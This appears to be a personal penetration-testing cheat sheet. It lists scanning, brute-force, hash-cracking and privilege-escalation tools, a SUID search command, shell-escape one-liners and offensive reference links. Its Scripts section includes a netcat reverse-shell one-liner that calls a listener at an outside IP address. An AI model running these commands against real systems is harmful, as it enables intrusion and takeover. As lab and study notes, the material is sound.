Tools
=====

Scanning
--------

-   nmap
-   rustscan
-   masscan
-   nikto

Directories
-----------

-   gobuster
-   zap
-   burp

Strings
-------

-   haiti - guess hash algorithm
-   codetective - find encoding algorithm
-   john
-   ssh2john

Brute-force
-----------

-   hydra
-   wpscan

Escalation
----------

-   linuxprivchecker

OSINT
-----

-   GHunt

Scripts
=======

-   `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`
-   `nmap --script=smb-enum-shares ...`
-   `rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.8.6.159 1337 >/tmp/f`
-   `grep "^j" rockyou.txt | grep "^[a-Z0-9\-\_]*$" | perl -e 'print sort { length($a) <=> length($b) } <>' > j-names.txt`

Spawing a shell
===============

-   python - `python -c 'import pty; pty.spawn("/bin/sh")'`
-   sh - `echo os.system('/bin/bash')`
-   sh - `/bin/sh -i`
-   perl - `perl —e 'exec "/bin/sh";'`
-   perl - `perl: exec "/bin/sh";`
-   ruby - `ruby: exec "/bin/sh"`
-   lua - `lua: os.execute('/bin/sh')`
-   IRB - `exec "/bin/sh"`
-   vi - `:!bash`
-   vi - `:set shell=/bin/bash:shell`
-   nmap - `!sh`

Websites
========

-   https://gtfobins.github.io/ - binary exploits
-   https://blackarch.org/tools.html - blackarch tools and descriptions
-   https://netsec.ws/?p=337 - various ways to spawn a shell
-   http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
-   https://book.hacktricks.xyz/linux-unix/privilege-escalation
-   https://github.com/swisskyrepo/PayloadsAllTheThings
-   https://github.com/sundowndev/hacker-roadmap
-   https://github.com/The-Art-of-Hacking/h4cker
-   https://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE
-   https://github.com/enaqx/awesome-pentest

# Login checklist
- Find and try default login credentials
- Look around locally for any possible usernames
- OSINT, continue to build list of possible logins
- All else fails, brute-force
